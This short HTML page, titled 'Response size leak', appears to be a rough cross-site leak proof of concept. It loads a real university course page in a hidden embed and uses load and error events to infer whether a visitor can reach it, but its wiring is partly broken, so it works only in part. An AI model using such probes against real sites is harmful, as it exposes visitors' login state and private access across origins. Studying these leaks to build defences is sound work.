<head>
  <title>Response size leak</title>

  <script>
    
    async function get(url) {
      const element = document.createElement('embed');
      element.type = 'text/html';
      element.src = url;

      return new Promise((resolve) => {
        element.onload = () => {
          console.log(`Accesible: ${url}`);
          document.body.innerHTML += `Accessible: ${url}`
        };
        element.onerror = () => {
          console.log(`Inaccessible: ${url}`);
          document.body.innerHTML += `Inaccessible: ${url}`
        };
      });
    }

    onload = () => {
      //get('https://learn.tsinghua.edu.cn/f/wlxt/index/course/student/');
    }

    let embed = document.getElementById('embed');
    let url = embed.src;

    function load() {
      console.log(`Accessible: ${url}`)
      document.body.innerHTML += `Accessible: ${url}`
    }

    function error() {
      console.log(`Inaccessible: ${url}`)
      document.body.innerHTML += `Inaccessible: ${url}`
    }

  </script>

</head>

<body>
  <embed style="display: none" id="embed" type="text/html" src="https://learn.tsinghua.edu.cn/f/wlxt/index/course/student/">
</body>

</html>
